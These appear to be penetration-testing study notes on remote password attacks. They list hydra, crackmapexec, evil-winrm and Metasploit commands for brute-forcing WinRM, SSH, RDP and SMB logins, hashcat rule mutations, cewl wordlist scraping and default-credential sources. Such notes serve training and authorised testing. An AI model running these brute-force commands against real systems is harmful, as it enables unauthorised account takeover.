# Misc

## Remote Password Attacks

### WinRM

#### crackmapexec

```bash
$ sudo apt-get -y install crackmapexec
$  crackmapexec <proto> -h
$ crackmapexec winrm <target-ip> -u user.list -p password.list
```

#### Evil-WinRM

```bash
$ sudo gem install evil-winrm
$ evil-winrm -i <target-ip> -u <username> -p <password>
```

If the login was successful, a terminal session is initialized using the PowerShell Remoting Protocol.

### SSH

```bash
$ hydra -L user.list -P password.list ssh://<target-ip>
$ ssh user@<target-ip>
```

### RDP

```bash
$ hydra -L user.list -P password.list rdp://<target-ip>
$ xfreerdp /v:<target-IP> /u:<username> /p:<password>
```

### SMB

#### Hydra (may cause an error if the SMB version3 is running)

```bash
$ hydra -L user.list -P password.list smb://<target-ip>
[ERROR] invalid reply from target smb://10.129.42.197:445/
```

#### Metasploit

```bash
$ msfconsole -q
msf6 > use auxiliary/scanner/smb/smb_login
```

#### Crackmapexec

```bash
$ crackmapexec smb <target-ip> -u "user" -p "password" --shares
```

#### SMBclient

```bash
$ smbclient -U user \\\\<target-ip>\\SHARENAME
```

### Password Mutations

#### Custom rules file

```bash
$ hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

#### Predefined rules

```bash
$ ls /usr/share/hashcat/rules/
best64.rule                  specific.rule
combinator.rule              T0XlC-insert_00-99_1950-2050_toprules_0_F.rule
d3ad0ne.rule                 T0XlC-insert_space_and_special_0_F.rule
dive.rule                    T0XlC-insert_top_100_passwords_1_G.rule
generated2.rule              T0XlC.rule
generated.rule               T0XlCv1.rule
hybrid                       toggles1.rule
Incisive-leetspeak.rule      toggles2.rule
InsidePro-HashManager.rule   toggles3.rule
InsidePro-PasswordsPro.rule  toggles4.rule
leetspeak.rule               toggles5.rule
oscommerce.rule              unix-ninja-leetspeak.rule
rockyou-30000.rule
```

#### Spidering the web for a wordlist

```bash
$ cewl https://<target-domain> -d 4 -m 6 --lowercase -w wordlist
```

### Default Creds

Look for [credential stuffing](https://owasp.org/www-community/attacks/Credential_stuffing).

Useful default creds [cheatsheet](https://github.com/ihebski/DefaultCreds-cheat-sheet).

#### Combined wordlist (user:pass)

```bash
$ hydra -C <user_pass.list> <protocol>://<IP>
```

Router default creds in [here](https://www.softwaretestinghelp.com/default-router-username-and-password-list/).
